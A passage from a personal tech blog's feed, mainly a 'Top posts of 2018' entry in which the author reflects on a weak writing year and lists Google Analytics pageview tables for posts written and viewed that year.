      <img src="http://dangoldin.com/assets/static/images/wordcloud_2018.png" alt="2018 wordcloud" width="600" height="600" layout="responsive"/>
      <p>Word clouds do a nice job of surfacing the key topics and themes and this year there was a lot of posts about the large tech companies. Next year I want to write less about the tech companies and more about technology itself.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Top posts of 2018</title>
   <link href="http://dangoldin.com/2018/12/25/top-posts-of-2018/"/>
   <updated>2018-12-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/25/top-posts-of-2018</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/2018-ga-blog-stats.png" alt="2018 Google Analytics blog stats" width="2594" height="742" layout="responsive"/>

<p>In the usual end-of-year tradition I want to share the top posts of 2018 - including both the posts that were written in 2018 as well as the posts that may have been written in prior years but viewed in 2018. Given the fact that I’ve been extremely behind in writing this year and am only catching up now it’s clear that 2018 was a weaker year than previous ones. Sorting all pages viewed in 2018 by descending pageviews the first post written in 2018 is in the 57th spot - every other post was written in prior years. That bodes well to the concept of evergreen content but it’s still disappointing that I didn’t have any noteworthy posts in 2018. The lesson for 2019 is to actually write on time and spend the time going into depth versus the more superficial and shorter posts I wrote in 2018. On a positive note it’s good to see that my blog does get a healthy flow of organic traffic despite the weak 2018 showing.</p>

<h2 id="most-popular-posts-written-in-2018">Most popular posts written in 2018</h2>

<table class="table"><thead><tr><th>Page</th><th>Pageviews</th><th>Unique Pageviews</th><th>Avg. Time on Page</th><th>Entrances</th><th>Bounce Rate</th><th>% Exit</th></tr></thead><tbody><tr><td>/2018/02/20/analyzing-aws-elb-logs/</td><td>71</td><td>62</td><td>114.38</td><td>56</td><td>94.64%</td><td>81.69%</td></tr><tr><td>/2018/08/15/google-calendar-constantly-shipping/</td><td>67</td><td>66</td><td>81.25</td><td>58</td><td>98.28%</td><td>88.06%</td></tr><tr><td>/2018/03/03/hunting-for-my-old-geocities-site/</td><td>63</td><td>56</td><td>181.67</td><td>51</td><td>88.24%</td><td>80.95%</td></tr><tr><td>/2018/04/28/rise-of-microbrands/</td><td>47</td><td>45</td><td>105.10</td><td>35</td><td>91.43%</td><td>78.72%</td></tr><tr><td>/2018/07/21/class-action-settlement-emails/</td><td>42</td><td>42</td><td>27.67</td><td>39</td><td>100.00%</td><td>92.86%</td></tr><tr><td>/2018/11/24/code-without-online-help/</td><td>41</td><td>41</td><td>141.00</td><td>39</td><td>97.44%</td><td>95.12%</td></tr><tr><td>/2018/11/25/aggressive-code-deprecation/</td><td>39</td><td>39</td><td>432.25</td><td>38</td><td>92.11%</td><td>89.74%</td></tr><tr><td>/2018/11/19/computer-history-books/</td><td>37</td><td>37</td><td>0.00</td><td>36</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/08/21/incognito-mode-chrome-vs-safari/</td><td>36</td><td>34</td><td>25.10</td><td>23</td><td>86.96%</td><td>72.22%</td></tr><tr><td>/2018/01/16/phonetic-distance/</td><td>34</td><td>28</td><td>319.22</td><td>24</td><td>79.17%</td><td>73.53%</td></tr><tr><td>/2018/06/05/alb-and-elb-access-log-schemas-for-redshift/</td><td>29</td><td>26</td><td>14.44</td><td>19</td><td>89.47%</td><td>68.97%</td></tr><tr><td>/2018/07/22/bulk-discounts-hurt-competition/</td><td>29</td><td>29</td><td>36.83</td><td>23</td><td>91.30%</td><td>79.31%</td></tr><tr><td>/2018/07/07/mysql-foreign-keys/</td><td>25</td><td>10</td><td>21.10</td><td>2</td><td>100.00%</td><td>16.00%</td></tr><tr><td>/2018/02/03/my-follower-factory/</td><td>18</td><td>16</td><td>81.67</td><td>3</td><td>66.67%</td><td>16.67%</td></tr><tr><td>/2018/05/12/curse-of-the-early-adopter/</td><td>16</td><td>16</td><td>56.00</td><td>10</td><td>100.00%</td><td>87.50%</td></tr><tr><td>/2018/01/03/learning-docker/</td><td>15</td><td>15</td><td>55.29</td><td>5</td><td>100.00%</td><td>53.33%</td></tr><tr><td>/2018/04/25/connect-four-bot-competition/</td><td>15</td><td>13</td><td>13.50</td><td>9</td><td>100.00%</td><td>73.33%</td></tr><tr><td>/2018/01/28/moviepass-a-fascinating-business-model/</td><td>14</td><td>13</td><td>93.14</td><td>6</td><td>100.00%</td><td>50.00%</td></tr><tr><td>/2018/05/14/memory-as-a-stack/</td><td>14</td><td>14</td><td>18.50</td><td>1</td><td>100.00%</td><td>28.57%</td></tr><tr><td>/2018/03/11/crowdsourced-data/</td><td>13</td><td>13</td><td>118.00</td><td>9</td><td>100.00%</td><td>92.31%</td></tr><tr><td>/2018/02/09/making-the-most-of-the-subway-commute/</td><td>12</td><td>12</td><td>29.50</td><td>4</td><td>100.00%</td><td>66.67%</td></tr><tr><td>/2018/06/01/type-1-and-type-2-tech-specs/</td><td>12</td><td>11</td><td>89.50</td><td>5</td><td>80.00%</td><td>50.00%</td></tr><tr><td>/2018/06/28/using-personal-aws-credentials-in-production/</td><td>11</td><td>11</td><td>41.50</td><td>2</td><td>100.00%</td><td>45.45%</td></tr><tr><td>/2018/03/18/facebooks-breach/</td><td>10</td><td>10</td><td>33.25</td><td>4</td><td>100.00%</td><td>60.00%</td></tr><tr><td>/2018/05/26/power-of-shell-commands/</td><td>10</td><td>10</td><td>60.00</td><td>3</td><td>100.00%</td><td>40.00%</td></tr><tr><td>/2018/07/29/privacy-vs-user-experience/</td><td>10</td><td>8</td><td>42.00</td><td>1</td><td>100.00%</td><td>40.00%</td></tr><tr><td>/2018/08/18/yahoo-fantasy-football-stats-2018-2019-edition/</td><td>10</td><td>9</td><td>199.20</td><td>3</td><td>66.67%</td><td>50.00%</td></tr><tr><td>/2018/07/10/in-a-software-world-humanity-comes-first/</td><td>9</td><td>9</td><td>20.00</td><td>4</td><td>100.00%</td><td>66.67%</td></tr><tr><td>/2018/11/21/superhuman-review/</td><td>9</td><td>8</td><td>38.50</td><td>6</td><td>100.00%</td><td>77.78%</td></tr><tr><td>/2018/04/12/load-testing/</td><td>8</td><td>8</td><td>53.75</td><td>2</td><td>100.00%</td><td>50.00%</td></tr><tr><td>/2018/04/17/secure-at-the-network-level/</td><td>8</td><td>8</td><td>28.60</td><td>3</td><td>100.00%</td><td>37.50%</td></tr><tr><td>/2018/10/13/equity-in-the-gig-economy/</td><td>8</td><td>7</td><td>45.60</td><td>3</td><td>100.00%</td><td>37.50%</td></tr><tr><td>/2018/10/29/gmails-autocomplete/</td><td>8</td><td>7</td><td>25.00</td><td>3</td><td>100.00%</td><td>62.50%</td></tr><tr><td>/2018/01/13/calendar-query-language/</td><td>7</td><td>7</td><td>16.33</td><td>4</td><td>100.00%</td><td>57.14%</td></tr><tr><td>/2018/03/25/protecting-data-ouside-of-a-terms-of-service/</td><td>7</td><td>7</td><td>28.00</td><td>6</td><td>100.00%</td><td>85.71%</td></tr><tr><td>/2018/04/03/open-sourcing-self-driving-car-data/</td><td>7</td><td>7</td><td>19.25</td><td>2</td><td>100.00%</td><td>42.86%</td></tr><tr><td>/2018/01/23/design-anti-pattern-tab-switching-autosave/</td><td>6</td><td>6</td><td>2.00</td><td>3</td><td>100.00%</td><td>83.33%</td></tr><tr><td>/2018/02/25/retrieving-kindle-highlights/</td><td>6</td><td>4</td><td>93.50</td><td>2</td><td>100.00%</td><td>33.33%</td></tr><tr><td>/2018/11/23/electronic-goods-are-cheaper-than-ever/</td><td>6</td><td>6</td><td>0.00</td><td>5</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/11/26/an-ad-on-the-google-search-homepage/</td><td>6</td><td>3</td><td>19.33</td><td>1</td><td>100.00%</td><td>50.00%</td></tr><tr><td>/2018/11/20/my-dataengconf-2018-talk/</td><td>5</td><td>5</td><td>12.00</td><td>1</td><td>100.00%</td><td>80.00%</td></tr><tr><td>/2018/02/10/optimize-for-keyboard-shortcuts/</td><td>4</td><td>4</td><td>5.00</td><td>0</td><td>0.00%</td><td>50.00%</td></tr><tr><td>/2018/10/25/just-ship-it/</td><td>4</td><td>4</td><td>24.00</td><td>0</td><td>0.00%</td><td>25.00%</td></tr><tr><td>/2018/11/16/python-3-and-aiohttp/</td><td>4</td><td>3</td><td>3.00</td><td>1</td><td>100.00%</td><td>75.00%</td></tr><tr><td>/2018/12/11/the-price-of-aws-vs-github/</td><td>4</td><td>4</td><td>21.00</td><td>2</td><td>100.00%</td><td>50.00%</td></tr><tr><td>/2018/11/12/social-security-administration-spoofing-scam/</td><td>3</td><td>3</td><td>0.00</td><td>2</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/11/13/a-ux-gem-in-google-slides/</td><td>3</td><td>3</td><td>7.00</td><td>2</td><td>100.00%</td><td>66.67%</td></tr><tr><td>/2018/11/22/historys-largest-empires/</td><td>3</td><td>3</td><td>50.00</td><td>1</td><td>100.00%</td><td>66.67%</td></tr><tr><td>/2018/11/25/exploring-my-backlinks/</td><td>3</td><td>3</td><td>0.00</td><td>3</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/11/30/tragedy-of-the-commons-apartment-edition/</td><td>3</td><td>3</td><td>50.00</td><td>2</td><td>100.00%</td><td>66.67%</td></tr><tr><td>/2018/12/03/overcoming-writing-rustiness/</td><td>3</td><td>2</td><td>36.50</td><td>0</td><td>0.00%</td><td>33.33%</td></tr><tr><td>/2018/12/10/emr-vs-databricks-costs/</td><td>3</td><td>3</td><td>36.00</td><td>2</td><td>100.00%</td><td>66.67%</td></tr><tr><td>/2018/12/13/counting-the-number-of-lines-of-code-in-a-github-account/</td><td>3</td><td>2</td><td>37.00</td><td>1</td><td>100.00%</td><td>66.67%</td></tr><tr><td>/2018/11/14/what-messaging-war/</td><td>2</td><td>2</td><td>2.00</td><td>0</td><td>0.00%</td><td>50.00%</td></tr><tr><td>/2018/11/18/falling-behind-my-2018-blogging-goal/</td><td>2</td><td>2</td><td>48.00</td><td>2</td><td>50.00%</td><td>50.00%</td></tr><tr><td>/2018/11/24/adding-optionality-to-products/</td><td>2</td><td>2</td><td>0.00</td><td>2</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/11/28/shell-history-2018-edition/</td><td>2</td><td>2</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/01/fat-specs-light-stories/</td><td>2</td><td>2</td><td>12.00</td><td>1</td><td>100.00%</td><td>50.00%</td></tr><tr><td>/2018/12/06/conference-call-echoes/</td><td>2</td><td>2</td><td>21.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/12/07/speech-recognition-and-a-bunch-of-apis/</td><td>2</td><td>2</td><td>0.00</td><td>2</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/14/state-of-tech-in-2018/</td><td>2</td><td>2</td><td>0.00</td><td>0</td><td>0.00%</td><td>100.00%</td></tr><tr><td>/2018/12/23/quoras-revenue-model/</td><td>2</td><td>2</td><td>0.00</td><td>2</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/11/15/limiting-tracking-in-email/</td><td>1</td><td>1</td><td>17.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/11/17/random-quotes/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/11/27/privacy-in-a-face-detection-world/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/04/how-many-wifi-devices-do-we-have/</td><td>1</td><td>1</td><td>37.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/12/05/the-golden-age-of-browsers/</td><td>1</td><td>1</td><td>0.00</td><td>0</td><td>0.00%</td><td>100.00%</td></tr><tr><td>/2018/12/08/automatic-login/</td><td>1</td><td>1</td><td>6.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/12/09/avoiding-content-overload/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/09/the-modern-economy-relies-on-information/</td><td>1</td><td>1</td><td>23.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/12/12/scenepeek/</td><td>1</td><td>1</td><td>7.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/12/15/new-code-is-not-a-linear-increase-in-complexity/</td><td>1</td><td>1</td><td>7.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/12/16/stuck-on-a-problem-take-a-break/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/17/the-new-company-town/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/18/i-finally-tried-an-electric-scooter/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/19/facebooks-latest-hit/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/19/new-iteration-of-devops/</td><td>1</td><td>1</td><td>57.00</td><td>0</td><td>0.00%</td><td>0.00%</td></tr><tr><td>/2018/12/21/global-roaming/</td><td>1</td><td>1</td><td>0.00</td><td>0</td><td>0.00%</td><td>100.00%</td></tr><tr><td>/2018/12/22/hackerrank/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/12/24/open-public-electronic-and-necessary-government-data-act/</td><td>1</td><td>1</td><td>0.00</td><td>1</td><td>100.00%</td><td>100.00%</td></tr></tbody></table>

<h2 id="most-popular-posts-viewed-in-2018">Most popular posts viewed in 2018</h2>

<table class="table"><thead><tr><th>Page</th><th>Pageviews</th><th>Unique Pageviews</th><th>Avg. Time on Page</th><th>Entrances</th><th>Bounce Rate</th><th>% Exit</th></tr></thead><tbody><tr><td>/2013/08/26/extract-info-from-a-web-page-using-javascript/</td><td>7492</td><td>7104</td><td>424.76</td><td>7095</td><td>94.56%</td><td>93.95%</td></tr><tr><td>/2013/06/21/where-are-you-on-the-sales-matrix/</td><td>3005</td><td>2727</td><td>279.80</td><td>2727</td><td>91.24%</td><td>90.68%</td></tr><tr><td>/2015/05/26/dealing-with-a-stripped-screw/</td><td>1465</td><td>1413</td><td>341.42</td><td>1412</td><td>96.67%</td><td>96.38%</td></tr><tr><td>/2015/09/24/mapping-the-jersey-city-parking-zones-ii/</td><td>1325</td><td>1036</td><td>93.95</td><td>1032</td><td>75.48%</td><td>77.74%</td></tr><tr><td>/2017/04/02/slacks-channel-exit-anti-pattern/</td><td>972</td><td>948</td><td>229.50</td><td>948</td><td>97.36%</td><td>97.12%</td></tr><tr><td>/2015/04/23/adding-columns-in-postgresql-and-redshift/</td><td>924</td><td>886</td><td>288.61</td><td>886</td><td>95.37%</td><td>95.24%</td></tr><tr><td>/2014/02/10/using-virtualenv-in-production/</td><td>816</td><td>789</td><td>324.12</td><td>786</td><td>96.18%</td><td>95.96%</td></tr><tr><td>/2016/01/10/cleanest-way-to-read-a-csv-file-with-python/</td><td>778</td><td>732</td><td>484.69</td><td>731</td><td>94.39%</td><td>93.70%</td></tr><tr><td>/2017/08/08/google-docs-vs-confluence/</td><td>584</td><td>572</td><td>346.06</td><td>571</td><td>97.20%</td><td>96.92%</td></tr><tr><td>/2016/01/03/paris-versus-new-york-city/</td><td>511</td><td>494</td><td>297.60</td><td>494</td><td>96.36%</td><td>96.09%</td></tr><tr><td>/2014/02/05/visualizing-gps-data-in-r/</td><td>428</td><td>379</td><td>166.70</td><td>375</td><td>88.00%</td><td>87.38%</td></tr><tr><td>/2014/10/01/normalizing-a-csv-file-using-mysql/</td><td>381</td><td>358</td><td>291.88</td><td>356</td><td>94.10%</td><td>93.18%</td></tr><tr><td>/2016/08/24/writing-scrapers-as-apis/</td><td>323</td><td>259</td><td>62.96</td><td>256</td><td>52.73%</td><td>56.04%</td></tr><tr><td>/2016/08/21/downloading-your-turo-ride-history/</td><td>318</td><td>278</td><td>181.63</td><td>179</td><td>88.83%</td><td>77.99%</td></tr><tr><td>/2017/11/07/spark-s-read-jdbc/</td><td>276</td><td>261</td><td>320.75</td><td>257</td><td>93.00%</td><td>91.30%</td></tr><tr><td>/2013/01/09/web-scraping-like-a-pro/</td><td>271</td><td>260</td><td>242.14</td><td>257</td><td>95.72%</td><td>94.83%</td></tr><tr><td>/2017/05/04/security-across-multiple-aws-regions/</td><td>271</td><td>266</td><td>137.60</td><td>266</td><td>98.12%</td><td>98.15%</td></tr><tr><td>/2017/10/09/downloading-your-aim-buddy-list/</td><td>221</td><td>213</td><td>420.22</td><td>213</td><td>96.24%</td><td>95.93%</td></tr><tr><td>/2016/02/15/design-your-database-for-flexibility/</td><td>219</td><td>214</td><td>382.22</td><td>212</td><td>96.23%</td><td>95.89%</td></tr><tr><td>/2014/09/20/dealing-with-an-rds-replication-issue/</td><td>212</td><td>202</td><td>180.27</td><td>202</td><td>95.05%</td><td>94.81%</td></tr><tr><td>/2016/03/10/the-mysql-enum-type/</td><td>195</td><td>191</td><td>256.71</td><td>188</td><td>97.87%</td><td>96.41%</td></tr><tr><td>/2013/06/07/fun-with-prolog-priceonomics-puzzle/</td><td>163</td><td>150</td><td>403.20</td><td>150</td><td>91.33%</td><td>90.80%</td></tr><tr><td>/2014/05/03/gap-fills-and-cross-joins-in-excel/</td><td>161</td><td>155</td><td>468.57</td><td>155</td><td>96.13%</td><td>95.65%</td></tr><tr><td>/2016/10/10/setting-up-secor-for-kafka-010/</td><td>153</td><td>147</td><td>231.56</td><td>146</td><td>93.84%</td><td>94.12%</td></tr><tr><td>/2016/05/11/identifying-unused-database-tables/</td><td>150</td><td>143</td><td>305.25</td><td>142</td><td>95.07%</td><td>94.67%</td></tr><tr><td>/2016/07/17/coding-puzzle-word-transformation-through-valid-words/</td><td>146</td><td>134</td><td>195.92</td><td>134</td><td>91.04%</td><td>91.10%</td></tr><tr><td>/2013/08/24/splitting-an-aws-account/</td><td>143</td><td>140</td><td>201.80</td><td>135</td><td>98.52%</td><td>96.50%</td></tr><tr><td>/2013/05/17/adding-attachments-to-django-postman/</td><td>140</td><td>128</td><td>299.38</td><td>126</td><td>92.86%</td><td>90.71%</td></tr><tr><td>/2017/06/30/send-private-messages-to-all-members-of-a-slack-channel/</td><td>134</td><td>111</td><td>186.34</td><td>109</td><td>78.90%</td><td>78.36%</td></tr><tr><td>/2013/07/17/scraping-yahoo-fantasy-football-stats-with-scrapy/</td><td>133</td><td>131</td><td>132.00</td><td>130</td><td>96.92%</td><td>96.24%</td></tr><tr><td>/2017/04/16/amp-and-subscription-paywalls/</td><td>127</td><td>120</td><td>146.60</td><td>117</td><td>94.02%</td><td>92.13%</td></tr><tr><td>/2011/01/08/fun-developer-interview-question/</td><td>124</td><td>114</td><td>412.42</td><td>114</td><td>89.47%</td><td>90.32%</td></tr><tr><td>/2016/12/31/amazons-peer-to-peer-marketplace/</td><td>117</td><td>111</td><td>157.67</td><td>110</td><td>93.64%</td><td>92.31%</td></tr><tr><td>/2017/07/08/yahoo-fantasy-football-stats-2017-2018-edition/</td><td>114</td><td>101</td><td>161.13</td><td>100</td><td>89.00%</td><td>86.84%</td></tr><tr><td>/2013/04/12/why-dont-cellphones-have-a-dialtone/</td><td>113</td><td>108</td><td>343.20</td><td>108</td><td>95.37%</td><td>95.58%</td></tr><tr><td>/2017/06/20/getting-amp-into-rss/</td><td>110</td><td>102</td><td>227.43</td><td>101</td><td>92.08%</td><td>87.27%</td></tr><tr><td>/2017/12/01/measuring-sprint-efficiency/</td><td>110</td><td>108</td><td>301.83</td><td>106</td><td>96.23%</td><td>94.55%</td></tr><tr><td>/2014/07/15/set-up-https-on-ec2-running-nginx-without-elb/</td><td>107</td><td>104</td><td>87.33</td><td>104</td><td>97.12%</td><td>97.20%</td></tr><tr><td>/2014/01/04/visualizing-runkeeper-data-in-r/</td><td>104</td><td>90</td><td>357.76</td><td>89</td><td>84.27%</td><td>83.65%</td></tr><tr><td>/2016/09/13/supporting-disqus-in-amp/</td><td>103</td><td>75</td><td>77.10</td><td>73</td><td>72.60%</td><td>70.87%</td></tr><tr><td>/2013/12/23/getting-a-sim-card-in-india/</td><td>98</td><td>96</td><td>253.50</td><td>95</td><td>96.84%</td><td>95.92%</td></tr><tr><td>/2015/04/26/aws-service-limits/</td><td>92</td><td>87</td><td>79.22</td><td>83</td><td>96.39%</td><td>90.22%</td></tr><tr><td>/2014/12/31/redirect-recursion/</td><td>91</td><td>90</td><td>143.00</td><td>89</td><td>98.88%</td><td>98.90%</td></tr><tr><td>/2016/12/24/comparing-public-transit-systems-new-york-vs-london/</td><td>91</td><td>88</td><td>506.33</td><td>88</td><td>97.73%</td><td>96.70%</td></tr><tr><td>/2014/05/02/migrating-from-linode-to-digital-ocean/</td><td>85</td><td>80</td><td>294.17</td><td>80</td><td>92.50%</td><td>92.94%</td></tr><tr><td>/2017/02/21/advice-for-coding-bootcamp-graduates/</td><td>84</td><td>83</td><td>808.50</td><td>82</td><td>97.56%</td><td>97.62%</td></tr><tr><td>/2016/08/29/food-identification-with-googles-cloud-vision/</td><td>83</td><td>74</td><td>109.70</td><td>74</td><td>89.19%</td><td>87.95%</td></tr><tr><td>/2016/11/13/recursive-redirects-with-aws-lambda/</td><td>82</td><td>75</td><td>237.00</td><td>74</td><td>93.24%</td><td>89.02%</td></tr><tr><td>/2016/12/10/word-clouds-and-text-similarity/</td><td>78</td><td>73</td><td>422.33</td><td>73</td><td>91.78%</td><td>92.31%</td></tr><tr><td>/2015/11/22/why-are-netflix-and-spotify-so-different/</td><td>76</td><td>74</td><td>516.00</td><td>74</td><td>97.30%</td><td>97.37%</td></tr><tr><td>/2017/04/23/the-golden-age-of-big-data-tools/</td><td>74</td><td>66</td><td>251.56</td><td>66</td><td>89.39%</td><td>87.84%</td></tr><tr><td>/2018/02/20/analyzing-aws-elb-logs/</td><td>71</td><td>62</td><td>114.38</td><td>56</td><td>94.64%</td><td>81.69%</td></tr><tr><td>/2014/09/16/top-down-vs-bottom-up-coding/</td><td>68</td><td>67</td><td>29.50</td><td>67</td><td>97.01%</td><td>97.06%</td></tr><tr><td>/2016/04/03/ben-thompsons-laddering-up-and-building-bigger-moats/</td><td>68</td><td>60</td><td>72.20</td><td>59</td><td>86.44%</td><td>85.29%</td></tr><tr><td>/2018/08/15/google-calendar-constantly-shipping/</td><td>67</td><td>66</td><td>81.25</td><td>58</td><td>98.28%</td><td>88.06%</td></tr><tr><td>/2013/08/28/simplicity-vs-power-in-product-design/</td><td>66</td><td>64</td><td>53.89</td><td>12</td><td>83.33%</td><td>46.97%</td></tr><tr><td>/2016/05/21/analyzing-imdb-data-step-1-cleaning-and-qa/</td><td>65</td><td>64</td><td>76.54</td><td>54</td><td>90.74%</td><td>80.00%</td></tr><tr><td>/2017/01/26/shame-on-united-and-bank-of-america/</td><td>64</td><td>63</td><td>37.00</td><td>63</td><td>98.41%</td><td>98.44%</td></tr><tr><td>/2018/03/03/hunting-for-my-old-geocities-site/</td><td>63</td><td>56</td><td>181.67</td><td>51</td><td>88.24%</td><td>80.95%</td></tr><tr><td>/2015/02/01/mysql-vs-postgresql-sort-order/</td><td>61</td><td>56</td><td>394.60</td><td>55</td><td>92.73%</td><td>91.80%</td></tr><tr><td>/2014/05/16/examining-ssh-login-requests/</td><td>59</td><td>54</td><td>657.20</td><td>54</td><td>90.74%</td><td>91.53%</td></tr><tr><td>/2016/05/22/analyzing-imdb-data-actors-vs-actresses/</td><td>58</td><td>51</td><td>46.63</td><td>49</td><td>67.35%</td><td>67.24%</td></tr><tr><td>/2016/11/27/visualizing-your-aws-costs/</td><td>58</td><td>53</td><td>58.50</td><td>52</td><td>92.31%</td><td>89.66%</td></tr><tr><td>/2017/03/19/refactor-driven-development/</td><td>56</td><td>50</td><td>104.33</td><td>50</td><td>90.00%</td><td>89.29%</td></tr><tr><td>/2017/04/11/sql-is-the-perfect-interface/</td><td>50</td><td>45</td><td>30.00</td><td>41</td><td>82.93%</td><td>78.00%</td></tr><tr><td>/2016/09/05/visualizing-fantasy-football-stats/</td><td>49</td><td>46</td><td>126.33</td><td>44</td><td>93.18%</td><td>93.88%</td></tr><tr><td>/2015/06/09/a-mysql-group-by-nuance/</td><td>48</td><td>47</td><td>17.00</td><td>44</td><td>95.45%</td><td>95.83%</td></tr><tr><td>/2016/06/22/messaging-app-fragmentation/</td><td>48</td><td>40</td><td>81.33</td><td>40</td><td>87.50%</td><td>81.25%</td></tr><tr><td>/2017/05/10/using-options-to-play-snapchats-quarterly-results/</td><td>47</td><td>46</td><td>146.00</td><td>45</td><td>97.78%</td><td>97.87%</td></tr><tr><td>/2018/04/28/rise-of-microbrands/</td><td>47</td><td>45</td><td>105.10</td><td>35</td><td>91.43%</td><td>78.72%</td></tr><tr><td>/2014/03/18/goodbye-gmail/</td><td>46</td><td>44</td><td>647.20</td><td>44</td><td>88.64%</td><td>89.13%</td></tr><tr><td>/2016/12/13/automatically-taking-screenshots-of-html-elements/</td><td>46</td><td>45</td><td>157.67</td><td>45</td><td>93.33%</td><td>93.48%</td></tr><tr><td>/2017/11/23/improving-jekyll-generation-speed-for-amp-pages/</td><td>46</td><td>42</td><td>118.57</td><td>42</td><td>83.33%</td><td>84.78%</td></tr><tr><td>/2016/03/05/aws-ec2-instance-arbitrage/</td><td>44</td><td>41</td><td>137.00</td><td>41</td><td>92.68%</td><td>90.91%</td></tr><tr><td>/2016/06/18/aws-stripe-and-wework/</td><td>44</td><td>43</td><td>56.00</td><td>42</td><td>97.62%</td><td>95.45%</td></tr><tr><td>/2017/04/08/quality-over-quantity-nextdoor-vs-craigslist/</td><td>44</td><td>41</td><td>99.00</td><td>40</td><td>92.50%</td><td>88.64%</td></tr><tr><td>/2013/11/15/rds-and-r/</td><td>42</td><td>40</td><td>901.50</td><td>40</td><td>95.00%</td><td>95.24%</td></tr><tr><td>/2014/04/04/postgresql-fibonacci/</td><td>42</td><td>39</td><td>607.00</td><td>39</td><td>92.31%</td><td>92.86%</td></tr><tr><td>/2018/07/21/class-action-settlement-emails/</td><td>42</td><td>42</td><td>27.67</td><td>39</td><td>100.00%</td><td>92.86%</td></tr><tr><td>/2018/11/24/code-without-online-help/</td><td>41</td><td>41</td><td>141.00</td><td>39</td><td>97.44%</td><td>95.12%</td></tr><tr><td>/2015/04/06/redshift-meets-excel/</td><td>40</td><td>40</td><td>7.00</td><td>39</td><td>100.00%</td><td>97.50%</td></tr><tr><td>/2015/04/19/dont-scrape-into-a-dropbox-folder/</td><td>40</td><td>39</td><td>196.00</td><td>39</td><td>97.44%</td><td>97.50%</td></tr><tr><td>/2016/06/11/following-up-on-a-website-optimization-offer/</td><td>40</td><td>32</td><td>174.22</td><td>32</td><td>78.13%</td><td>77.50%</td></tr><tr><td>/2018/11/25/aggressive-code-deprecation/</td><td>39</td><td>39</td><td>432.25</td><td>38</td><td>92.11%</td><td>89.74%</td></tr><tr><td>/2013/08/02/a-brief-history-of-manufacturing/</td><td>38</td><td>38</td><td>186.00</td><td>37</td><td>97.30%</td><td>97.37%</td></tr><tr><td>/2015/05/26/dealing-with-a-stripped-screw/?usqp=mq331AQECAEYAQ==</td><td>38</td><td>38</td><td>0.00</td><td>38</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2018/11/19/computer-history-books/</td><td>37</td><td>37</td><td>0.00</td><td>36</td><td>100.00%</td><td>100.00%</td></tr><tr><td>/2013/06/21/where-are-you-on-the-sales-matrix/?usqp=mq331AQECAEYAQ==</td><td>36</td><td>31</td><td>364.80</td><td>31</td><td>83.87%</td><td>86.11%</td></tr><tr><td>/2018/08/21/incognito-mode-chrome-vs-safari/</td><td>36</td><td>34</td><td>25.10</td><td>23</td><td>86.96%</td><td>72.22%</td></tr><tr><td>/2017/02/09/traffic-efficiency/</td><td>35</td><td>34</td><td>56.50</td><td>34</td><td>94.12%</td><td>94.29%</td></tr><tr><td>/2017/10/20/schedule-automation-using-google-spreadsheets-and-slack/</td><td>35</td><td>29</td><td>34.55</td><td>28</td><td>75.00%</td><td>68.57%</td></tr><tr><td>/2018/01/16/phonetic-distance/</td><td>34</td><td>28</td><td>319.22</td><td>24</td><td>79.17%</td><td>73.53%</td></tr><tr><td>/2015/05/30/date-range-generation/</td><td>31</td><td>28</td><td>35.40</td><td>26</td><td>92.31%</td><td>83.87%</td></tr><tr><td>/2016/04/05/the-best-code-is-no-code/</td><td>30</td><td>29</td><td>715.00</td><td>29</td><td>96.55%</td><td>96.67%</td></tr><tr><td>/2014/08/30/managing-settings-files-in-django-projects/</td><td>29</td><td>29</td><td>713.00</td><td>29</td><td>96.55%</td><td>96.55%</td></tr><tr><td>/2016/06/06/word-clouds-in-r/</td><td>29</td><td>28</td><td>90.00</td><td>26</td><td>96.15%</td><td>89.66%</td></tr><tr><td>/2018/06/05/alb-and-elb-access-log-schemas-for-redshift/</td><td>29</td><td>26</td><td>14.44</td><td>19</td><td>89.47%</td><td>68.97%</td></tr><tr><td>/2018/07/22/bulk-discounts-hurt-competition/</td><td>29</td><td>29</td><td>36.83</td><td>23</td><td>91.30%</td><td>79.31%</td></tr><tr><td>/2013/11/23/im-joining-triplelift/</td><td>28</td><td>26</td><td>16.50</td><td>25</td><td>68.00%</td><td>64.29%</td></tr><tr><td>/2017/09/09/apartment-rental-arbitrage/</td><td>28</td><td>26</td><td>92.50</td><td>26</td><td>92.31%</td><td>92.86%</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Happy holidays from Visual Studio Code</title>
   <link href="http://dangoldin.com/2018/12/25/happy-holidays-from-visual-studio-code/"/>
